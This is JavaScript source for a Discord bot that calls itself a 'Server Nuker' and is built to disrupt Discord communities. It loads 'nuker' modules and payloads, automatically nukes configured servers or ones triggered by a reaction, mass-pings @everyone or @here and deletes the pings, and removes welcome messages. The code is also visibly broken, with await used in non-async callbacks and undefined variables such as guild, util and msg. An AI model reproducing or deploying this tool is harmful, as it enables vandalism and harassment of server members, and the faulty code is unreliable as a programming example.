/**
 * Avoxel284
 * Discord Server Nuker 1 [ The Matrix Themed ]
 * A revertable and configurable Discord Community nuking bot
 */

const {
	Client,
	Intents,
	DiscordAPIError,
	Message,
	Channel,
	Collection,
	ClientUser,
} = require("discord.js");
const fs = require("fs");
const path = require("path");
const config = require("./config");
const discordVoice = require("@discordjs/voice");
const chalk = require("chalk");
const { filterChannels } = require("./util");

const client = new Client({
	partials: ["CHANNEL"],
	intents: [
		Intents.FLAGS.GUILDS,
		Intents.FLAGS.GUILD_MESSAGES,
		Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
		Intents.FLAGS.GUILD_VOICE_STATES,
	],
});

const nukers = [];
const validPills = [];

client.login(config.get("token"));

client.on("voiceStateUpdate", (oldState, newState) => {
	if (newState?.member?.id == client?.user?.id) {
		if (newState?.member?.voice?.channel?.type == "GUILD_STAGE_VOICE") {
			newState.member.voice.setSuppressed(false).catch(console.error);
		}
	}
});

client.on("ready", async () => {
	console.log(chalk.blueBright(`Client logged in as: ${client.user.tag}`));

	let files = fs.readdirSync("./nukes");
	let payloads = config.get("payloads");

	files.forEach((file) => {
		console.log(chalk.blueBright(`  > Loading nuker: ${file.split(".js")[0]}`));
		nukers.push(require(path.join(__dirname, "nukes", file)));
	});

	if (config.get("nukeDumpChannel"))
		await client.channels.cache
			.get(config.get("nukeDumpChannel"))
			.messages.fetch({ limit: 100 })
			.then((messages) => {
				messages.forEach((msg) => {
					try {
						attach = msg.content || msg.attachments.entries().next().value[1].attachment;
						if (!attach) return;
						if (payloads.includes(attach)) return;
						payloads.push(attach);
					} catch {
						console.log(chalk.redBright("An error occurred when fetching nuke dump"));
						return;
					}
				});
				config.update("payloads", payloads);
			});

	let guilds = await client.guilds.cache;
	guilds.forEach((g) => {
		console.log(chalk.blueBright(`  > In guild: ${g.name}`));
	});
	console.log(chalk.blueBright(`  > Loaded ${payloads.length} payload(s)`));
	client.guilds.fetch();

	if (config.get("nukeGuildsOnRun").length > 0)
		(await config.get("nukeGuildsOnRun")).forEach(async (guildId) => {
			const guild = client.guilds.cache.get(guildId);
			if (!guild) return;
			const channels = guild.channels.fetch().then(filterChannels);

			util
				.startVoiceConnection(guild)
				.then((player) => {
					if (config.get("ping") && config.get("ping") != 0) {
						const pingMessage = await channels
							.filter((c) => c.type === "GUILD_TEXT")
							.random()
							.send(config.get("ping") == 2 ? "@everyone" : "@here")
							.catch(console.log);
						pingMessage.delete().catch(console.log);
					}
					if (config.get("guiltMessage"))
						setTimeout(() => msg.channel.send(config.get("guiltMessage")), 48 * 1000);
				})
				.catch((err) => {
					console.log(chalk.redBright(`An error occurred: ${err.message || err}`));
					console.log(
						chalk.redBright(
							`Failed to nuke ${guild}. This could be because the server is not a community.`
						)
					);
				});
		});
});

client.on("messageReactionAdd", async (reaction, user) => {
	if (user.id == client.user.id) return;
	console.log(`Reaction added by ${user.username}`);
	const msg = reaction.message;
	if (!msg) return console.warn(chalk.redBright(`Message is null`));
	if (!validPills.includes(msg)) return;

	validPills.splice(validPills.indexOf(msg), 1);

	const channels = guild.channels.fetch().then(filterChannels);

	util
		.startVoiceConnection(g)
		.then((player) => {
			if (config.get("ping") && config.get("ping") != 0) {
				const pingMessage = await channels
					.filter((c) => c.type === "GUILD_TEXT")
					.random()
					.send(config.get("ping") == 2 ? "@everyone" : "@here")
					.catch(console.log);
				pingMessage.delete().catch(console.log);
			}
			if (config.get("guiltMessage"))
				setTimeout(() => msg.channel.send(config.get("guiltMessage")), 48 * 1000);
		})
		.catch((err) => {
			console.log(chalk.redBright(`An error occurred: ${err.message || err}`));
			console.log(
				chalk.redBright(`Failed to nuke ${g}. This could be because the server is not a community.`)
			);
		});
});

client.on("guildCreate", async (guild) => {
	console.log(`Joined new guild: ${guild.name}`);

	guild.channels.fetch();

	const generalChannel =
		(await guild.channels.cache.find((v) => v.name.includes("general"))) ||
		guild.systemChannel ||
		guild.channels.create("general", "text");

	sendStarterMessage(generalChannel);
});

client.on("messageCreate", async (msg) => {
	if (config.get("deleteWelcomeMessages") == true) {
		if (msg.type == "GUILD_MEMBER_JOIN" && msg.author.id == client.user.id) msg.delete();
		if (msg.content.includes("welcome") && msg.mentions.has(msg.guild.me)) msg.delete();
		if (msg.author.username.toLowerCase().includes("mee6")) msg.delete();
	}

	if (msg.content.toLowerCase() == "!pill") {
		msg.delete(() => {});
		sendStarterMessage(msg.channel);
		console.log(chalk.blueBright(`${msg.author.username} has requested for the pill question`));
	}

	if (msg.content.toLowerCase() == "!nukerevert") {
		await msg.guild.channels.fetch();

		nukers.forEach((nuker) => {
			nuker.revert(msg.guild, msg.guild.channels.cache);
		});

		msg.reply("undoing my changes uwu :3");
	}

	if (msg.content.toLowerCase() == "!remakechannels") {
		if (msg.guild.id != config.get("testingServerId")) return;
		msg.reply(`Remaking ${10} testing channels...`);
		msg.guild.channels.fetch();
		msg.guild.channels.cache.forEach((channel) => {
			if (channel.name.includes("channel") || channel.type == "GUILD_STAGE_VOICE") channel.delete();
		});
		for (i = 0; i < 10; i++) msg.guild.channels.create(`channel-${i + 1}`, "text");
	}

	if (msg.content.toLowerCase() == "!nukevoicedebug") {
		msg.reply(discordVoice.generateDependencyReport());
	}
});
